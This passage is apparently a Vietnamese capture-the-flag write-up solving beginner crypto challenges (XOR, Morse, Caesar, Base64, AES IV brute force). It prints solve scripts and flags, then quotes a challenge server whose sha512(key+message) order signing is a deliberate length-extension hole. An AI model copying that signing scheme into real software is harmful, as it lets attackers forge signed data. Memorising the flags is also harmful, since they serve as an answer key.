+<p>Quy trình mã hóa dữ liệu trông như thế này:</p>
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">flag</span> <span class="o">=</span> <span class="c1">###SECRET###
+</span><span class="n">key</span> <span class="o">=</span> <span class="c1">###SECRET###
+</span><span class="k">assert</span> <span class="nb">len</span><span class="p">(</span><span class="n">key</span><span class="p">)</span> <span class="o">==</span> <span class="mi">1</span>
+
+<span class="k">def</span> <span class="nf">encrypt</span><span class="p">(</span><span class="n">a</span><span class="p">,</span><span class="n">b</span><span class="p">):</span>
+    <span class="k">return</span> <span class="s">''</span><span class="p">.</span><span class="n">join</span><span class="p">([</span><span class="nb">hex</span><span class="p">(</span><span class="nb">ord</span><span class="p">(</span><span class="n">b</span><span class="p">[</span><span class="n">i</span><span class="o">%</span><span class="nb">len</span><span class="p">(</span><span class="n">b</span><span class="p">)])</span> <span class="o">^</span> <span class="nb">ord</span><span class="p">(</span><span class="n">a</span><span class="p">[</span><span class="n">i</span><span class="p">]))[</span><span class="mi">2</span><span class="p">:]</span> <span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span><span class="nb">len</span><span class="p">(</span><span class="n">a</span><span class="p">))])</span>
+
+<span class="k">with</span> <span class="nb">open</span><span class="p">(</span><span class="s">'cipher.txt'</span><span class="p">,</span> <span class="s">'w'</span><span class="p">)</span> <span class="k">as</span> <span class="n">f</span><span class="p">:</span>
+	<span class="n">f</span><span class="p">.</span><span class="n">write</span><span class="p">(</span><span class="n">encrypt</span><span class="p">(</span><span class="n">flag</span><span class="p">,</span> <span class="n">key</span><span class="p">))</span>
+</code></pre></div></div>
+
+<p>Sau khi mã hóa thì file flag ban đầu biến đổi thành <code class="language-plaintext highlighter-rouge">6c464b4d514b744817491714487449174b57</code></p>
+
+<p>Đọc sơ qua đoạn code thì đây là một chương trình mã hóa khá cơ bản, mã hóa XOR và độ dài key là 1, vậy thì ta có thể dễ dàng brute key và sau đó XOR với đoạn cipher đã được unhex để lấy lại flag ban đầu.</p>
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">def</span> <span class="nf">decrypt</span><span class="p">():</span>
+    <span class="n">f</span> <span class="o">=</span> <span class="nb">open</span><span class="p">(</span><span class="s">'cipher.txt'</span><span class="p">,</span> <span class="s">'r'</span><span class="p">)</span>
+    <span class="n">a</span> <span class="o">=</span> <span class="n">f</span><span class="p">.</span><span class="n">read</span><span class="p">()</span>
+    <span class="n">k</span> <span class="o">=</span> <span class="mi">0</span>
+    <span class="n">ar</span> <span class="o">=</span> <span class="p">[]</span>
+    <span class="k">for</span> <span class="n">j</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="nb">len</span><span class="p">(</span><span class="n">a</span><span class="p">)</span><span class="o">//</span><span class="mi">2</span><span class="p">):</span>
+        <span class="n">ar</span><span class="p">.</span><span class="n">append</span><span class="p">(</span><span class="nb">int</span><span class="p">(</span><span class="n">a</span><span class="p">[</span><span class="n">k</span><span class="p">]</span><span class="o">+</span><span class="n">a</span><span class="p">[</span><span class="n">k</span><span class="o">+</span><span class="mi">1</span><span class="p">],</span> <span class="mi">16</span><span class="p">))</span>
+        <span class="n">k</span><span class="o">+=</span><span class="mi">2</span>
+    <span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="mi">300</span><span class="p">):</span>
+        <span class="k">if</span> <span class="n">i</span> <span class="o">^</span> <span class="n">ar</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span> <span class="o">==</span> <span class="nb">ord</span><span class="p">(</span><span class="s">'F'</span><span class="p">):</span>
+            <span class="n">key</span> <span class="o">=</span> <span class="n">i</span>
+            <span class="k">break</span>
+    <span class="n">res</span> <span class="o">=</span> <span class="s">''</span>
+    <span class="k">for</span> <span class="n">l</span> <span class="ow">in</span> <span class="n">ar</span><span class="p">:</span>
+        <span class="n">res</span><span class="o">+=</span><span class="nb">chr</span><span class="p">(</span><span class="n">l</span> <span class="o">^</span> <span class="n">key</span><span class="p">)</span>
+    
+    <span class="k">print</span><span class="p">(</span><span class="n">res</span><span class="p">)</span>
+
+<span class="n">decrypt</span><span class="p">()</span>
+</code></pre></div></div>
+
+<p>Sau khi chạy thì ta có flag là: <code class="language-plaintext highlighter-rouge">Flag{a^b=c=&gt;b^c=a}</code></p>
+
+<h2 id="morse">MORSE</h2>
+<blockquote>
+  <p>Suỵt! Tập trung và đeo tai nghe lên nào. Gà có nghe thấy nhịp beat không? Họ nói gì từ bên kia chiến tuyến Format: Flag{what_you_find}</p>
+</blockquote>
+
+<p>Bài này cho ta một file âm thanh chứa morse code, dân chơi nghe phát biết liền.</p>
+
+<p>Quăng lên cho <a href="https://morsecode.world/international/decoder/audio-decoder-adaptive.html">tool này</a> là có flag luôn.</p>
+
+<p>Flag: <code class="language-plaintext highlighter-rouge">Flag{M.O.R.S.E.C.O.D.E}</code></p>
+
+<h2 id="julius-caesar">Julius Caesar</h2>
+<blockquote>
+  <p>Vô tình khi khai quật khảo cổ, Gà tìm được một thông điệp bí ẩn khoảng hơn 100 năm trước công nguyên. Nghe đồn đây là một bí thuật đã bị thay đổi công thức của một vị tướng Julius Caesar, sau này trở thành vị vua đầu tiên của đế chế La Mã hùng mạnh.</p>
+
+  <p>Hãy giúp Gà giải mật thư này!</p>
+</blockquote>
+
+<p>Đề bài cho ta 1 file chứa đoạn cipher: <code class="language-plaintext highlighter-rouge">Synt{Ry_Pynfvpb_Pvcure}</code></p>
+
+<p>Này thì rõ như ban ngày là caesar cipher rồi, dùng tool trên mạng là ra liền.</p>
+
+<p>Flag: <code class="language-plaintext highlighter-rouge">Flag{El_Clasico_Cipher}</code></p>
+
+<h2 id="sixty-four">Sixty Four</h2>
+<blockquote>
+  <p>Gà để lại một thông điệp bí mật nhưng nó không làm khó được trí thông minh của Mèo Yang Hồ.</p>
+</blockquote>
+
+<p>Đề bài cho ta 1 file chứa đoạn cipher: <code class="language-plaintext highlighter-rouge">NDY2QzYxNjc3QjVGNUY1RjQyNjE3MzY1MzYzNDc4NDg2NTc4NUY1RjVGN0Q=</code></p>
+
+<p>Nhìn cái cipher là biết luôn base64, decode thôi, xong thì ra thế này: <code class="language-plaintext highlighter-rouge">466C61677B5F5F5F426173653634784865785F5F5F7D</code></p>
+
+<p>Nhìn phát biết luôn là hex, đem lên tool hex to ascii phát nữa là có flag.</p>
+
+<p>Flag: <code class="language-plaintext highlighter-rouge">Flag{___Base64xHex___}</code></p>
+
+<h2 id="bruh-aes">Bruh AES</h2>
+<blockquote>
+  <p>Ôi không, Hazy lỡ xoá đi một mảnh ghép trong quá trình mã hoá AES mất rồi :)</p>
+</blockquote>
+
+<p>Về cơ bản thì đề bài cho ta một file cipher, flag sau khi đã bị mã hóa AES và 1 file cho thấy quy trình mã hóa đó. Ta biết được flag dài 38 kí tự, key mã hóa đã có sắn tuy nhiên Initial Vector đã bị ẩn đi 2 kí tự, vì vậy ta chỉ cần viết script brute hai kí tự đó rồi decrypt là xong.</p>
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">iv_part1</span> <span class="o">=</span> <span class="s">"0xcafedeadbeef"</span>
+
+<span class="kn">import</span> <span class="nn">sys</span>
+<span class="kn">import</span> <span class="nn">base64</span>
+<span class="kn">import</span> <span class="nn">string</span> 
+<span class="kn">from</span> <span class="nn">Crypto.Cipher</span> <span class="kn">import</span> <span class="n">AES</span>
+
+<span class="n">key</span> <span class="o">=</span> <span class="sa">b</span><span class="s">'supersecretkey!?'</span>
+<span class="n">sys</span><span class="p">.</span><span class="n">stdin</span> <span class="o">=</span> <span class="nb">open</span><span class="p">(</span><span class="s">"cipher.txt"</span><span class="p">,</span> <span class="s">"rb"</span><span class="p">)</span>
+<span class="n">sys</span><span class="p">.</span><span class="n">stdout</span> <span class="o">=</span> <span class="nb">open</span><span class="p">(</span><span class="s">"flag.txt"</span><span class="p">,</span> <span class="s">"w"</span><span class="p">)</span>
+<span class="n">algorithm</span> <span class="o">=</span> <span class="n">AES</span><span class="p">.</span><span class="n">MODE_CBC</span>
+
+<span class="k">def</span> <span class="nf">decrypt</span><span class="p">(</span><span class="n">payload</span><span class="p">,</span> <span class="n">key</span><span class="p">,</span> <span class="n">iv</span><span class="p">):</span>
+    <span class="n">cip</span> <span class="o">=</span> <span class="n">AES</span><span class="p">.</span><span class="n">new</span><span class="p">(</span><span class="n">key</span><span class="p">,</span> <span class="n">algorithm</span><span class="p">,</span> <span class="n">iv</span><span class="p">)</span>
+    <span class="k">return</span> <span class="n">cip</span><span class="p">.</span><span class="n">decrypt</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span>
+
+<span class="n">cipher</span> <span class="o">=</span> <span class="nb">input</span><span class="p">()</span>
+
+<span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="n">string</span><span class="p">.</span><span class="n">printable</span><span class="p">:</span>
+    <span class="k">for</span> <span class="n">j</span> <span class="ow">in</span> <span class="n">string</span><span class="p">.</span><span class="n">printable</span><span class="p">:</span>
+        <span class="n">iv</span> <span class="o">=</span> <span class="n">iv_part1</span> <span class="o">+</span> <span class="n">i</span> <span class="o">+</span> <span class="n">j</span>
+        <span class="n">enc</span> <span class="o">=</span> <span class="n">decrypt</span><span class="p">(</span><span class="n">cipher</span><span class="p">,</span> <span class="n">key</span><span class="p">,</span> <span class="n">iv</span><span class="p">.</span><span class="n">encode</span><span class="p">())</span>
+        <span class="n">ans</span> <span class="o">=</span> <span class="n">enc</span><span class="p">[:</span><span class="mi">38</span><span class="p">].</span><span class="n">decode</span><span class="p">()</span>
+        <span class="k">if</span> <span class="p">(</span><span class="n">ans</span><span class="p">[</span><span class="mi">15</span><span class="p">]</span> <span class="ow">in</span> <span class="n">string</span><span class="p">.</span><span class="n">hexdigits</span> <span class="ow">and</span> <span class="n">ans</span><span class="p">[</span><span class="mi">14</span><span class="p">]</span> <span class="ow">in</span> <span class="n">string</span><span class="p">.</span><span class="n">hexdigits</span><span class="p">):</span>
+            <span class="k">print</span><span class="p">(</span><span class="s">"iv :"</span><span class="p">,</span> <span class="n">iv</span><span class="p">,</span> <span class="s">"flag:"</span><span class="p">,</span> <span class="n">ans</span><span class="p">)</span>
+</code></pre></div></div>
+
+<p>Cứ nghĩ là ez flag nhưng không, sau khi chạy thì file flag ra cả nùi. Đây cũng là lý do mình ghét challenge này nhất, quá guessing, rất tụt mood.</p>
+
+<p>Ngồi mò mấm đoán đoán một hồi thì cũng mò đúng .__. IV là <code class="language-plaintext highlighter-rouge">0xcafedeadbeefx0</code></p>
+
+<p>Flag: <code class="language-plaintext highlighter-rouge">Flag{f4edced3a1c3e72be1257f232a7a78b6}</code></p>
+
+<h2 id="cry-more">Cry more</h2>
+<blockquote>
+  <p>Mã mua dài quá nên không mua được :(
+Bạn có thể mua flag hộ Hazy được không :D
+nc chal1.crypto.letspentest.org 7000</p>
+</blockquote>
+
+<p>Chương trình cho ta luôn chương trình python chạy ở phía server</p>
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kn">import</span> <span class="nn">datetime</span>
+<span class="kn">import</span> <span class="nn">os</span>
+<span class="kn">import</span> <span class="nn">random</span>
+<span class="kn">import</span> <span class="nn">socketserver</span>
+<span class="kn">import</span> <span class="nn">sys</span>
+<span class="kn">from</span> <span class="nn">base64</span> <span class="kn">import</span> <span class="n">b64decode</span><span class="p">,</span> <span class="n">b64encode</span>
+<span class="kn">from</span> <span class="nn">hashlib</span> <span class="kn">import</span> <span class="n">sha512</span>
+
+
+<span class="k">def</span> <span class="nf">get_flag</span><span class="p">():</span>
+    <span class="k">try</span><span class="p">:</span>
+        <span class="k">with</span> <span class="nb">open</span><span class="p">(</span><span class="s">'flag.txt'</span><span class="p">,</span> <span class="s">'rb'</span><span class="p">)</span> <span class="k">as</span> <span class="n">f</span><span class="p">:</span>
+            <span class="n">flag</span> <span class="o">=</span> <span class="n">f</span><span class="p">.</span><span class="n">read</span><span class="p">()</span>
+            <span class="k">return</span> <span class="n">flag</span>
+    <span class="k">except</span> <span class="nb">Exception</span> <span class="k">as</span> <span class="n">e</span><span class="p">:</span>
+        <span class="k">print</span><span class="p">(</span><span class="n">e</span><span class="p">)</span>
+        <span class="k">return</span> <span class="sa">b</span><span class="s">'Server is not configured correctly. Please contact admins to fix the problem'</span>
+
+
+<span class="n">items</span> <span class="o">=</span> <span class="p">[</span>
+    <span class="p">(</span><span class="sa">b</span><span class="s">'Fowl x 3'</span><span class="p">,</span> <span class="mi">1</span><span class="p">),</span>
+    <span class="p">(</span><span class="sa">b</span><span class="s">'Mora x 30000'</span><span class="p">,</span> <span class="mi">100</span><span class="p">),</span>
+    <span class="p">(</span><span class="sa">b</span><span class="s">'Mystic Enhancement Ore x 5'</span><span class="p">,</span> <span class="mi">500</span><span class="p">),</span>
+    <span class="p">(</span><span class="sa">b</span><span class="s">'Hero</span><span class="se">\'</span><span class="s">s Wits x 3'</span><span class="p">,</span> <span class="mi">1000</span><span class="p">),</span>
+    <span class="p">(</span><span class="sa">b</span><span class="s">'Primogems x 40'</span><span class="p">,</span> <span class="mi">5000</span><span class="p">),</span>
+    <span class="p">(</span><span class="sa">b</span><span class="s">'FLAG'</span><span class="p">,</span> <span class="mi">99999</span><span class="p">)</span>
+<span class="p">]</span>
+
+
+<span class="k">class</span> <span class="nc">RequestHandler</span><span class="p">(</span><span class="n">socketserver</span><span class="p">.</span><span class="n">StreamRequestHandler</span><span class="p">):</span>
+
+    <span class="k">def</span> <span class="nf">handle</span><span class="p">(</span><span class="bp">self</span><span class="p">):</span>
+        <span class="bp">self</span><span class="p">.</span><span class="n">signkey</span> <span class="o">=</span> <span class="n">os</span><span class="p">.</span><span class="n">urandom</span><span class="p">(</span><span class="n">random</span><span class="p">.</span><span class="n">randint</span><span class="p">(</span><span class="mi">8</span><span class="p">,</span> <span class="mi">32</span><span class="p">))</span>
+        <span class="bp">self</span><span class="p">.</span><span class="n">money</span> <span class="o">=</span> <span class="n">random</span><span class="p">.</span><span class="n">randint</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span> <span class="mi">2000</span><span class="p">)</span>
+        <span class="k">try</span><span class="p">:</span>
+            <span class="k">while</span> <span class="bp">True</span><span class="p">:</span>
+                <span class="bp">self</span><span class="p">.</span><span class="n">menu</span><span class="p">()</span>
+
+                <span class="k">try</span><span class="p">:</span>
+                    <span class="bp">self</span><span class="p">.</span><span class="n">request</span><span class="p">.</span><span class="n">sendall</span><span class="p">(</span><span class="sa">b</span><span class="s">'Your choice: '</span><span class="p">)</span>
+                    <span class="n">opt</span> <span class="o">=</span> <span class="nb">int</span><span class="p">(</span><span class="bp">self</span><span class="p">.</span><span class="n">rfile</span><span class="p">.</span><span class="n">readline</span><span class="p">().</span><span class="n">decode</span><span class="p">())</span>
+                <span class="k">except</span> <span class="nb">ValueError</span><span class="p">:</span>
+                    <span class="bp">self</span><span class="p">.</span><span class="n">request</span><span class="p">.</span><span class="n">sendall</span><span class="p">(</span>
+                        <span class="sa">b</span><span class="s">'THIS IS A CRYPTOGRAPHIC CHALLENGE!!!</span><span class="se">\n</span><span class="s">'</span><span class="p">)</span>
+                    <span class="k">continue</span>
+                <span class="k">if</span> <span class="n">opt</span> <span class="o">==</span> <span class="mi">1</span><span class="p">:</span>
+                    <span class="bp">self</span><span class="p">.</span><span class="nb">list</span><span class="p">()</span>
+                <span class="k">elif</span> <span class="n">opt</span> <span class="o">==</span> <span class="mi">2</span><span class="p">:</span>
+                    <span class="bp">self</span><span class="p">.</span><span class="n">order</span><span class="p">()</span>
+                <span class="k">elif</span> <span class="n">opt</span> <span class="o">==</span> <span class="mi">3</span><span class="p">:</span>
+                    <span class="bp">self</span><span class="p">.</span><span class="n">confirm</span><span class="p">()</span>
+                <span class="k">elif</span> <span class="n">opt</span> <span class="o">==</span> <span class="mi">4</span><span class="p">:</span>
+                    <span class="bp">self</span><span class="p">.</span><span class="n">request</span><span class="p">.</span><span class="n">sendall</span><span class="p">(</span><span class="sa">b</span><span class="s">'Bye~</span><span class="se">\n</span><span class="s">'</span><span class="p">)</span>
+                    <span class="k">return</span>
+                <span class="k">else</span><span class="p">:</span>
+                    <span class="bp">self</span><span class="p">.</span><span class="n">request</span><span class="p">.</span><span class="n">sendall</span><span class="p">(</span><span class="sa">b</span><span class="s">'Ohh~</span><span class="se">\n</span><span class="s">'</span><span class="p">)</span>
+
+        <span class="k">except</span> <span class="p">(</span><span class="nb">ConnectionResetError</span><span class="p">,</span> <span class="nb">ConnectionAbortedError</span><span class="p">,</span> <span class="nb">BrokenPipeError</span><span class="p">):</span>
+            <span class="k">print</span><span class="p">(</span><span class="s">"{} disconnected"</span><span class="p">.</span><span class="nb">format</span><span class="p">(</span><span class="bp">self</span><span class="p">.</span><span class="n">client_address</span><span class="p">[</span><span class="mi">0</span><span class="p">]))</span>
+
+    <span class="k">def</span> <span class="nf">menu</span><span class="p">(</span><span class="bp">self</span><span class="p">):</span>
+        <span class="bp">self</span><span class="p">.</span><span class="n">request</span><span class="p">.</span><span class="n">sendall</span><span class="p">(</span>
+            <span class="sa">b</span><span class="s">'To celebrate `our` first anniversary, we are offering you tons of product at the best prices</span><span class="se">\n</span><span class="s">'</span><span class="p">)</span>
+        <span class="bp">self</span><span class="p">.</span><span class="n">request</span><span class="p">.</span><span class="n">sendall</span><span class="p">(</span><span class="sa">b</span><span class="s">'You have $%d</span><span class="se">\n</span><span class="s">'</span> <span class="o">%</span> <span class="bp">self</span><span class="p">.</span><span class="n">money</span><span class="p">)</span>
+        <span class="bp">self</span><span class="p">.</span><span class="n">request</span><span class="p">.</span><span class="n">sendall</span><span class="p">(</span><span class="sa">b</span><span class="s">'1. Available products</span><span class="se">\n</span><span class="s">'</span><span class="p">)</span>
+        <span class="bp">self</span><span class="p">.</span><span class="n">request</span><span class="p">.</span><span class="n">sendall</span><span class="p">(</span><span class="sa">b</span><span class="s">'2. Order</span><span class="se">\n</span><span class="s">'</span><span class="p">)</span>
+        <span class="bp">self</span><span class="p">.</span><span class="n">request</span><span class="p">.</span><span class="n">sendall</span><span class="p">(</span><span class="sa">b</span><span class="s">'3. Confirm order</span><span class="se">\n</span><span class="s">'</span><span class="p">)</span>
+        <span class="bp">self</span><span class="p">.</span><span class="n">request</span><span class="p">.</span><span class="n">sendall</span><span class="p">(</span><span class="sa">b</span><span class="s">'4. Exit</span><span class="se">\n</span><span class="s">'</span><span class="p">)</span>
+
+    <span class="k">def</span> <span class="nf">list</span><span class="p">(</span><span class="bp">self</span><span class="p">):</span>
+        <span class="k">for</span> <span class="n">idx</span><span class="p">,</span> <span class="n">item</span> <span class="ow">in</span> <span class="nb">enumerate</span><span class="p">(</span><span class="n">items</span><span class="p">):</span>
+            <span class="bp">self</span><span class="p">.</span><span class="n">request</span><span class="p">.</span><span class="n">sendall</span><span class="p">(</span><span class="sa">b</span><span class="s">'%d - %s: $%d</span><span class="se">\n</span><span class="s">'</span> <span class="o">%</span>
+                                 <span class="p">(</span><span class="n">idx</span> <span class="o">+</span> <span class="mi">1</span><span class="p">,</span> <span class="n">item</span><span class="p">[</span><span class="mi">0</span><span class="p">],</span> <span class="n">item</span><span class="p">[</span><span class="mi">1</span><span class="p">]))</span>
+
+    <span class="k">def</span> <span class="nf">order</span><span class="p">(</span><span class="bp">self</span><span class="p">):</span>
+        <span class="k">try</span><span class="p">:</span>
+            <span class="bp">self</span><span class="p">.</span><span class="n">request</span><span class="p">.</span><span class="n">sendall</span><span class="p">(</span><span class="sa">b</span><span class="s">'ID: '</span><span class="p">)</span>
+            <span class="n">pid</span> <span class="o">=</span> <span class="nb">int</span><span class="p">(</span><span class="bp">self</span><span class="p">.</span><span class="n">rfile</span><span class="p">.</span><span class="n">readline</span><span class="p">().</span><span class="n">decode</span><span class="p">())</span>
+        <span class="k">except</span> <span class="nb">ValueError</span><span class="p">:</span>
+            <span class="bp">self</span><span class="p">.</span><span class="n">request</span><span class="p">.</span><span class="n">sendall</span><span class="p">(</span>
+                <span class="sa">b</span><span class="s">'THIS IS A CRYPTOGRAPHIC CHALLENGE!!!</span><span class="se">\n</span><span class="s">'</span><span class="p">)</span>
+            <span class="k">return</span>
+
+        <span class="k">if</span> <span class="n">pid</span> <span class="o">&lt;</span> <span class="mi">1</span> <span class="ow">or</span> <span class="n">pid</span> <span class="o">&gt;</span> <span class="nb">len</span><span class="p">(</span><span class="n">items</span><span class="p">):</span>
+            <span class="bp">self</span><span class="p">.</span><span class="n">request</span><span class="p">.</span><span class="n">sendall</span><span class="p">(</span><span class="sa">b</span><span class="s">'Ohh~</span><span class="se">\n</span><span class="s">'</span><span class="p">)</span>
+            <span class="k">return</span>
+
+        <span class="n">payment</span> <span class="o">=</span> <span class="sa">b</span><span class="s">'product=%s&amp;price=%d&amp;time=%.02f'</span> <span class="o">%</span> <span class="p">(</span>
+            <span class="n">items</span><span class="p">[</span><span class="n">pid</span><span class="o">-</span><span class="mi">1</span><span class="p">][</span><span class="mi">0</span><span class="p">],</span> <span class="n">items</span><span class="p">[</span><span class="n">pid</span><span class="o">-</span><span class="mi">1</span><span class="p">][</span><span class="mi">1</span><span class="p">],</span> <span class="n">datetime</span><span class="p">.</span><span class="n">datetime</span><span class="p">.</span><span class="n">now</span><span class="p">().</span><span class="n">timestamp</span><span class="p">())</span>
+        <span class="n">signature</span> <span class="o">=</span> <span class="n">sha512</span><span class="p">(</span><span class="bp">self</span><span class="p">.</span><span class="n">signkey</span><span class="o">+</span><span class="n">payment</span><span class="p">).</span><span class="n">hexdigest</span><span class="p">()</span>
+        <span class="n">payment</span> <span class="o">+=</span> <span class="sa">b</span><span class="s">'&amp;sign=%s'</span> <span class="o">%</span> <span class="n">signature</span><span class="p">.</span><span class="n">encode</span><span class="p">()</span>
+        <span class="bp">self</span><span class="p">.</span><span class="n">request</span><span class="p">.</span><span class="n">sendall</span><span class="p">(</span><span class="sa">b</span><span class="s">'Your order: '</span><span class="p">)</span>
+        <span class="bp">self</span><span class="p">.</span><span class="n">request</span><span class="p">.</span><span class="n">sendall</span><span class="p">(</span><span class="n">b64encode</span><span class="p">(</span><span class="n">payment</span><span class="p">))</span>
+        <span class="bp">self</span><span class="p">.</span><span class="n">request</span><span class="p">.</span><span class="n">sendall</span><span class="p">(</span><span class="sa">b</span><span class="s">'</span><span class="se">\n</span><span class="s">'</span><span class="p">)</span>
+
+    <span class="k">def</span> <span class="nf">confirm</span><span class="p">(</span><span class="bp">self</span><span class="p">):</span>
+        <span class="k">try</span><span class="p">:</span>
+            <span class="bp">self</span><span class="p">.</span><span class="n">request</span><span class="p">.</span><span class="n">sendall</span><span class="p">(</span><span class="sa">b</span><span class="s">'Your order: '</span><span class="p">)</span>
+            <span class="n">payment</span> <span class="o">=</span> <span class="n">b64decode</span><span class="p">(</span><span class="bp">self</span><span class="p">.</span><span class="n">rfile</span><span class="p">.</span><span class="n">readline</span><span class="p">().</span><span class="n">rstrip</span><span class="p">(</span><span class="sa">b</span><span class="s">'</span><span class="se">\n</span><span class="s">'</span><span class="p">))</span>
+        <span class="k">except</span> <span class="nb">Exception</span><span class="p">:</span>
+            <span class="bp">self</span><span class="p">.</span><span class="n">request</span><span class="p">.</span><span class="n">sendall</span><span class="p">(</span>
+                <span class="sa">b</span><span class="s">'THIS IS A CRYPTOGRAPHIC CHALLENGE!!!</span><span class="se">\n</span><span class="s">'</span><span class="p">)</span>
+            <span class="k">return</span>
+
+        <span class="n">pos</span> <span class="o">=</span> <span class="n">payment</span><span class="p">.</span><span class="n">rfind</span><span class="p">(</span><span class="sa">b</span><span class="s">'&amp;sign='</span><span class="p">)</span>
+        <span class="k">if</span> <span class="n">pos</span> <span class="o">==</span> <span class="o">-</span><span class="mi">1</span><span class="p">:</span>
+            <span class="bp">self</span><span class="p">.</span><span class="n">request</span><span class="p">.</span><span class="n">sendall</span><span class="p">(</span><span class="sa">b</span><span class="s">'Invalid order</span><span class="se">\n</span><span class="s">'</span><span class="p">)</span>
+            <span class="k">return</span>
+
+        <span class="n">signature</span> <span class="o">=</span> <span class="n">payment</span><span class="p">[</span><span class="n">pos</span> <span class="o">+</span> <span class="mi">6</span><span class="p">:]</span>
+        <span class="k">if</span> <span class="n">sha512</span><span class="p">(</span><span class="bp">self</span><span class="p">.</span><span class="n">signkey</span><span class="o">+</span><span class="n">payment</span><span class="p">[:</span><span class="n">pos</span><span class="p">]).</span><span class="n">hexdigest</span><span class="p">().</span><span class="n">encode</span><span class="p">()</span> <span class="o">!=</span> <span class="n">signature</span><span class="p">:</span>
+            <span class="bp">self</span><span class="p">.</span><span class="n">request</span><span class="p">.</span><span class="n">sendall</span><span class="p">(</span><span class="sa">b</span><span class="s">'Invalid order</span><span class="se">\n</span><span class="s">'</span><span class="p">)</span>
+            <span class="k">return</span>
+
+        <span class="n">m</span> <span class="o">=</span> <span class="bp">self</span><span class="p">.</span><span class="n">parse_qsl</span><span class="p">(</span><span class="n">payment</span><span class="p">[:</span><span class="n">pos</span><span class="p">])</span>
+        <span class="k">try</span><span class="p">:</span>
+            <span class="n">pname</span> <span class="o">=</span> <span class="n">m</span><span class="p">[</span><span class="sa">b</span><span class="s">'product'</span><span class="p">]</span>
+            <span class="n">price</span> <span class="o">=</span> <span class="nb">int</span><span class="p">(</span><span class="n">m</span><span class="p">[</span><span class="sa">b</span><span class="s">'price'</span><span class="p">])</span>
+        <span class="k">except</span> <span class="p">(</span><span class="nb">KeyError</span><span class="p">,</span> <span class="nb">ValueError</span><span class="p">,</span> <span class="nb">IndexError</span><span class="p">):</span>
+            <span class="bp">self</span><span class="p">.</span><span class="n">request</span><span class="p">.</span><span class="n">sendall</span><span class="p">(</span><span class="sa">b</span><span class="s">'Invalid order</span><span class="se">\n</span><span class="s">'</span><span class="p">)</span>
+            <span class="k">return</span>
+
+        <span class="k">if</span> <span class="n">price</span> <span class="o">&gt;</span> <span class="bp">self</span><span class="p">.</span><span class="n">money</span><span class="p">:</span>
+            <span class="bp">self</span><span class="p">.</span><span class="n">request</span><span class="p">.</span><span class="n">sendall</span><span class="p">(</span><span class="sa">b</span><span class="s">'Oops</span><span class="se">\n</span><span class="s">'</span><span class="p">)</span>
+            <span class="k">return</span>
+
+        <span class="bp">self</span><span class="p">.</span><span class="n">money</span> <span class="o">-=</span> <span class="n">price</span>
+        <span class="bp">self</span><span class="p">.</span><span class="n">request</span><span class="p">.</span><span class="n">sendall</span><span class="p">(</span>
+            <span class="sa">b</span><span class="s">'Transaction is completed. Your balance: $%d</span><span class="se">\n</span><span class="s">'</span> <span class="o">%</span> <span class="bp">self</span><span class="p">.</span><span class="n">money</span><span class="p">)</span>
+        <span class="k">if</span> <span class="n">pname</span> <span class="o">==</span> <span class="sa">b</span><span class="s">'FLAG'</span><span class="p">:</span>
+            <span class="k">print</span><span class="p">(</span><span class="s">"{} solved the challenge"</span><span class="p">.</span><span class="nb">format</span><span class="p">(</span><span class="bp">self</span><span class="p">.</span><span class="n">client_address</span><span class="p">[</span><span class="mi">0</span><span class="p">]))</span>
+            <span class="bp">self</span><span class="p">.</span><span class="n">request</span><span class="p">.</span><span class="n">sendall</span><span class="p">(</span><span class="sa">b</span><span class="s">'Here is your flag: %s</span><span class="se">\n</span><span class="s">'</span> <span class="o">%</span> <span class="n">get_flag</span><span class="p">())</span>
+        <span class="k">else</span><span class="p">:</span>
+            <span class="bp">self</span><span class="p">.</span><span class="n">request</span><span class="p">.</span><span class="n">sendall</span><span class="p">(</span>
+                <span class="sa">b</span><span class="s">'%s will be delivered to your in-game mailbox soon</span><span class="se">\n</span><span class="s">'</span> <span class="o">%</span> <span class="n">pname</span><span class="p">)</span>
+
+    <span class="k">def</span> <span class="nf">parse_qsl</span><span class="p">(</span><span class="bp">self</span><span class="p">,</span> <span class="n">query</span><span class="p">):</span>
+        <span class="n">m</span> <span class="o">=</span> <span class="p">{}</span>
+        <span class="n">parts</span> <span class="o">=</span> <span class="n">query</span><span class="p">.</span><span class="n">split</span><span class="p">(</span><span class="sa">b</span><span class="s">'&amp;'</span><span class="p">)</span>
+        <span class="k">for</span> <span class="n">part</span> <span class="ow">in</span> <span class="n">parts</span><span class="p">:</span>
+            <span class="n">key</span><span class="p">,</span> <span class="n">val</span> <span class="o">=</span> <span class="n">part</span><span class="p">.</span><span class="n">split</span><span class="p">(</span><span class="sa">b</span><span class="s">'='</span><span class="p">)</span>
+            <span class="n">m</span><span class="p">[</span><span class="n">key</span><span class="p">]</span> <span class="o">=</span> <span class="n">val</span>
+        <span class="k">return</span> <span class="n">m</span>
+
+
+<span class="k">class</span> <span class="nc">ThreadedTCPServer</span><span class="p">(</span><span class="n">socketserver</span><span class="p">.</span><span class="n">ThreadingMixIn</span><span class="p">,</span> <span class="n">socketserver</span><span class="p">.</span><span class="n">TCPServer</span><span class="p">):</span>
+    <span class="k">pass</span>
+
+
+<span class="k">def</span> <span class="nf">main</span><span class="p">(</span><span class="n">argv</span><span class="p">):</span>
+    <span class="n">host</span><span class="p">,</span> <span class="n">port</span> <span class="o">=</span> <span class="s">'localhost'</span><span class="p">,</span> <span class="mi">8000</span>
+
+    <span class="k">if</span> <span class="nb">len</span><span class="p">(</span><span class="n">argv</span><span class="p">)</span> <span class="o">==</span> <span class="mi">2</span><span class="p">:</span>
+        <span class="n">port</span> <span class="o">=</span> <span class="nb">int</span><span class="p">(</span><span class="n">argv</span><span class="p">[</span><span class="mi">1</span><span class="p">])</span>
